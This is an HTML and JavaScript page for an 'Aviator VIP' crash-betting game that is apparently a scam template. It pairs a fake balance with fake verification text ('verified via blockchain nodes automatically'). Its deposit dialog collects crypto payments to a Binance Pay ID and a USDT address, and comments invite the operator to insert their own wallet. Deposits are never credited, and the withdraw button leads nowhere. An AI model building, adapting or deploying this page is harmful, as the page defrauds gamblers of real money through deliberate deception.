<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviator VIP Official</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0b0f1a; font-family: 'Inter', sans-serif; overflow: hidden; color: white; }
        .game-area { background: #131722; position: relative; border-radius: 20px; border: 2px solid #2d3343; overflow: hidden; height: 350px; width: 100%; max-width: 800px; margin: auto; }
        .grid-bg { position: absolute; width: 200%; height: 200%; background-image: linear-gradient(#1e222d 1.5px, transparent 1.5px), linear-gradient(90deg, #1e222d 1.5px, transparent 1.5px); background-size: 50px 50px; transform: translate(-25%, -25%); z-index: 1; }
        #plane { position: absolute; bottom: 30px; left: 30px; font-size: 45px; z-index: 10; transition: transform 0.1s linear; display: none; filter: drop-shadow(0 0 15px #ff0000); color: #ff0000; }
        .multiplier { font-size: 70px; font-weight: 900; z-index: 20; text-shadow: 0 0 30px rgba(255,255,255,0.4); font-style: italic; position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); }
        .timer-container { position: absolute; bottom: 0; left: 0; width: 100%; height: 6px; background: #1e293b; z-index: 30; display: none; }
        #timerLine { height: 100%; width: 100%; background: #facc15; transition: width 7s linear; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
        .crypto-card { background: #1e293b; border: 1px solid #334155; padding: 15px; border-radius: 15px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; }
        .crypto-card:hover { border-color: #f3ba2f; background: #2d2d1a; }
        .copy-btn { background: #f3ba2f; color: black; font-size: 10px; padding: 4px 8px; border-radius: 5px; font-weight: bold; }
    </style>
</head>
<body class="p-4 flex flex-col items-center justify-center min-h-screen">

    <div class="w-full max-w-[800px] flex justify-between items-center p-3 bg-slate-900 rounded-2xl mb-4 border border-slate-800 shadow-xl">
        <div class="flex gap-2">
            <button onclick="showModal('dep')" class="bg-[#f3ba2f] px-4 py-2 rounded-lg text-xs font-bold text-black shadow-lg">DEPOSIT</button>
            <button onclick="showModal('wit')" class="bg-slate-800 px-4 py-2 rounded-lg text-xs font-bold text-red-400">WITHDRAW</button>
        </div>
        <div class="text-right">
            <p class="text-[10px] text-slate-500 uppercase font-bold">Secure Balance</p>
            <h2 id="bal" class="text-xl text-emerald-400 font-black">$5.00</h2>
        </div>
    </div>

    <div class="game-area shadow-2xl">
        <div class="grid-bg" id="grid"></div>
        <div id="statusText" class="text-xs text-yellow-500 font-bold absolute top-[20%] left-1/2 -translate-x-1/2 z-20 uppercase tracking-widest">Next Round in 7s</div>
        <div id="plane">✈️</div>
        <div id="mult" class="multiplier">1.00x</div>
        <div id="timerBar" class="timer-container"><div id="timerLine"></div></div>
    </div>

    <div class="w-full max-w-[800px] grid grid-cols-1 md:grid-cols-2 gap-4 mt-6">
        <div class="bg-slate-900 p-5 rounded-3xl flex flex-col gap-3 border border-slate-800">
            <input type="number" id="amt" value="1" class="bg-slate-950 p-3 rounded-xl text-center text-2xl font-black outline-none border border-slate-700 text-yellow-500">
            <button onclick="placeBet()" id="pBtn" class="bg-red-600 p-5 rounded-2xl text-3xl font-black transition-all uppercase shadow-[0_5px_0_#991b1b]">BET</button>
        </div>
        <div class="bg-slate-900 p-5 rounded-3xl border border-slate-800">
             <p class="text-[10px] text-slate-500 mb-2 font-bold flex justify-between uppercase">
                <span>Network Status: Encrypted</span>
                <span id="target" class="text-emerald-500">Play: $0 / $1000</span>
            </p>
            <div id="fakeBets" class="flex flex-col gap-1 h-24 overflow-hidden"></div>
        </div>
    </div>

    <div id="depModal" class="modal">
        <div class="bg-[#161a1e] p-6 rounded-3xl border border-[#f3ba2f] w-full max-w-sm relative">
            <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-500">✕</button>
            
            <div id="depStep1">
                <div class="flex justify-center mb-4"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/1024px-Binance_logo.svg.png" class="h-6"></div>
                <h2 class="text-lg font-bold text-center mb-4">Choose Method</h2>
                
                <div class="crypto-card flex items-center gap-4" onclick="nextDepStep('Binance Pay')">
                    <div class="bg-yellow-500/10 p-2 rounded-full">🟡</div>
                    <div><p class="font-bold">Binance Pay (ID)</p><p class="text-[10px] text-slate-400">Zero Fees - Instant</p></div>
                </div>

                <div class="crypto-card flex items-center gap-4" onclick="nextDepStep('USDT-TRC20')">
                    <div class="bg-emerald-500/10 p-2 rounded-full">🟢</div>
                    <div><p class="font-bold">USDT (TRC20)</p><p class="text-[10px] text-slate-400">All Crypto Wallets</p></div>
                </div>
            </div>

            <div id="depStep2" style="display: none;">
                <h2 id="methodTitle" class="text-center font-bold text-yellow-500 mb-4">BINANCE DEPOSIT</h2>
                <div class="bg-black p-4 rounded-xl border border-slate-800 mb-4 text-center">
                    <p id="addressLabel" class="text-[10px] text-slate-500 mb-1 font-bold">WALLET ADDRESS</p>
                    <p id="walletAddr" class="text-[11px] font-mono break-all text-white font-bold mb-2">03431793371</p> <button class="copy-btn" onclick="alert('Address Copied!')">COPY</button>
                </div>
                <div class="space-y-3">
                    <input type="text" placeholder="Paste Transaction Hash / ID" class="w-full bg-slate-900 p-3 rounded-xl border border-slate-700 outline-none text-sm">
                    <button onclick="submitDep()" class="w-full bg-[#f3ba2f] p-4 rounded-xl font-black text-black">VERIFY PAYMENT</button>
                    <p class="text-[9px] text-center text-slate-500 italic">Payments are verified via blockchain nodes automatically.</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        let balance = 5.00, mult = 1.0, crashPoint = 0, gameTimer, betAmount = 0, isBetPlaced = false, isCashedOut = false, isRoundActive = false, totalWagered = 0;

        function showModal(type) { document.getElementById(type === 'dep' ? 'depModal' : 'witModal').style.display = 'flex'; }
        function closeModal() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }

        function nextDepStep(method) {
            document.getElementById('depStep1').style.display = 'none';
            document.getElementById('depStep2').style.display = 'block';
            document.getElementById('methodTitle').innerText = method + " DEPOSIT";
            
            // Yahan aap apna Wallet Address/ID update kar sakte hain
            if(method === 'Binance Pay') {
                document.getElementById('addressLabel').innerText = "BINANCE PAY ID";
                document.getElementById('walletAddr').innerText = "03431793371"; // Apna Binance Pay ID dein
            } else {
                document.getElementById('addressLabel').innerText = "USDT TRC20 ADDRESS";
                document.getElementById('walletAddr').innerText = "TX8sP9uR...YOUR_ADDRESS"; // Apna USDT Address dein
            }
        }

        function submitDep() {
            alert("Node Verification in Progress... Your balance will be updated automatically within 10 minutes.");
            closeModal();
        }

        // --- Game Logic (Same as before) ---
        function startNewCycle() {
            isRoundActive = false; isBetPlaced = false; isCashedOut = false;
            document.getElementById('statusText').style.display = 'block';
            document.getElementById('timerBar').style.display = 'block';
            document.getElementById('timerLine').style.width = '100%';
            document.getElementById('mult').innerText = "1.00x";
            document.getElementById('pBtn').innerText = "BET";
            document.getElementById('pBtn').className = "bg-red-600 p-5 rounded-2xl text-3xl font-black transition-all uppercase shadow-[0_5px_0_#991b1b]";
            setTimeout(() => { document.getElementById('timerLine').style.width = '0%'; }, 50);
            setTimeout(startPlane, 7000);
        }

        function placeBet() {
            if (isRoundActive) { if (isBetPlaced && !isCashedOut) cashout(); return; }
            let amt = parseFloat(document.getElementById('amt').value);
            if (amt > balance) return alert("Low Balance!");
            betAmount = amt; isBetPlaced = true;
            document.getElementById('pBtn').innerText = "PLACED";
        }

        function startPlane() {
            isRoundActive = true;
            document.getElementById('timerBar').style.display = 'none';
            document.getElementById('statusText').style.display = 'none';
            document.getElementById('plane').style.display = 'block';
            mult = 1.0; crashPoint = (Math.random() * 4.0 + 1.1).toFixed(2);
            if (isBetPlaced) {
                totalWagered += betAmount;
                document.getElementById('target').innerText = "Play: $" + totalWagered.toFixed(0) + " / $1000";
                document.getElementById('pBtn').className = "bg-yellow-500 text-black p-5 rounded-2xl text-3xl font-black";
                document.getElementById('pBtn').innerHTML = `CASHOUT<br><span id="profit" class="text-sm">$0.00</span>`;
            }
            gameTimer = setInterval(() => {
                mult += 0.01;
                document.getElementById('mult').innerText = mult.toFixed(2) + "x";
                if (isBetPlaced && !isCashedOut) document.getElementById('profit').innerText = "PROFIT: $" + (betAmount * mult).toFixed(2);
                let posX = (mult * 30); let posY = (mult * 20);
                document.getElementById('plane').style.transform = `translate(${posX}px, -${posY}px) rotate(-15deg)`;
                if (mult >= crashPoint) { clearInterval(gameTimer); endRound(); }
            }, 60);
        }

        function cashout() {
            if (isCashedOut) return;
            balance += (betAmount * mult) - betAmount;
            isCashedOut = true;
            document.getElementById('pBtn').innerHTML = `SUCCESS`;
            document.getElementById('bal').innerText = "$" + balance.toFixed(2);
        }

        function endRound() {
            document.getElementById('plane').style.display = 'none';
            document.getElementById('mult').innerText = "FLEW AWAY!";
            if (isBetPlaced && !isCashedOut) { balance -= betAmount; document.getElementById('bal').innerText = "$" + balance.toFixed(2); }
            setTimeout(startNewCycle, 3000);
        }

        startNewCycle();
    </script>
</body>
</html>
